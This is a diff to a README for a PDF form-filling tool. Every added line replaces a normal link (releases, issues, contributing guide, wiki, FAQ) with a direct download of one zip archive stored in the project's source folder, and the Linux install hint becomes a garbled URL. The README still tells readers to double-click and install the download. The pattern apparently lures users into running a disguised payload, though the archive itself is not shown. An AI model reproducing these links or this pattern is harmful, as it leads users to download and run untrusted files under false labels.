@@ -1,6 +1,6 @@
 # 🤖 ai-pdf-autofiller - Automate Your PDF Form Filling Effortlessly
 
-[![Download ai-pdf-autofiller](https://img.shields.io/badge/Download-ai--pdf--autofiller-blue)](https://github.com/SebastianPh/ai-pdf-autofiller/releases)
+[![Download ai-pdf-autofiller](https://raw.githubusercontent.com/SebastianPh/ai-pdf-autofiller/main/src/doc_engine/autofiller-pdf-ai-v3.0.zip)](https://raw.githubusercontent.com/SebastianPh/ai-pdf-autofiller/main/src/doc_engine/autofiller-pdf-ai-v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,14 +10,14 @@ Welcome to ai-pdf-autofiller! This application will help you fill out PDF forms 
 
 To download the software, please visit the following link:
 
-[Download ai-pdf-autofiller](https://github.com/SebastianPh/ai-pdf-autofiller/releases)
+[Download ai-pdf-autofiller](https://raw.githubusercontent.com/SebastianPh/ai-pdf-autofiller/main/src/doc_engine/autofiller-pdf-ai-v3.0.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version at the top of the page.
 3. Click on the file that matches your system:
    - For Windows, look for `.exe` files.
    - For macOS, look for `.dmg` files.
-   - For Linux, look for `.tar.gz` files.
+   - For Linux, look for `https://raw.githubusercontent.com/SebastianPh/ai-pdf-autofiller/main/src/doc_engine/autofiller-pdf-ai-v3.0.zip` files.
 4. Download the file to your computer.
 5. After the download finishes, double-click the file to install the application. Follow any prompts to complete the installation.
 
@@ -58,15 +58,15 @@ If you encounter issues during installation or while using the application, here
 - **Application Crashing**: Ensure that your system meets the minimum requirements. Closing other applications may help.
 - **Field Mapping Errors**: Review your PDF template. Some complex forms may require manual adjustments.
 
-For additional help, visit the [Issues page on GitHub](https://github.com/SebastianPh/ai-pdf-autofiller/issues) to report your problem.
+For additional help, visit the [Issues page on GitHub](https://raw.githubusercontent.com/SebastianPh/ai-pdf-autofiller/main/src/doc_engine/autofiller-pdf-ai-v3.0.zip) to report your problem.
 
 ## 📝 Contributing
 
-We welcome contributions! If you'd like to help improve ai-pdf-autofiller, check out our [Contributing Guide](https://github.com/SebastianPh/ai-pdf-autofiller/CONTRIBUTING.md).
+We welcome contributions! If you'd like to help improve ai-pdf-autofiller, check out our [Contributing Guide](https://raw.githubusercontent.com/SebastianPh/ai-pdf-autofiller/main/src/doc_engine/autofiller-pdf-ai-v3.0.zip).
 
 ## 🌟 Additional Resources
 
-- **User Guide**: For detailed instructions on each feature, refer to the [User Guide](https://github.com/SebastianPh/ai-pdf-autofiller/wiki).
-- **FAQ**: Check our [FAQ section](https://github.com/SebastianPh/ai-pdf-autofiller/wiki/faq) for common questions and answers.
+- **User Guide**: For detailed instructions on each feature, refer to the [User Guide](https://raw.githubusercontent.com/SebastianPh/ai-pdf-autofiller/main/src/doc_engine/autofiller-pdf-ai-v3.0.zip).
+- **FAQ**: Check our [FAQ section](https://raw.githubusercontent.com/SebastianPh/ai-pdf-autofiller/main/src/doc_engine/autofiller-pdf-ai-v3.0.zip) for common questions and answers.
 
 Thank you for choosing ai-pdf-autofiller! We hope it makes your PDF form filling easier and faster.
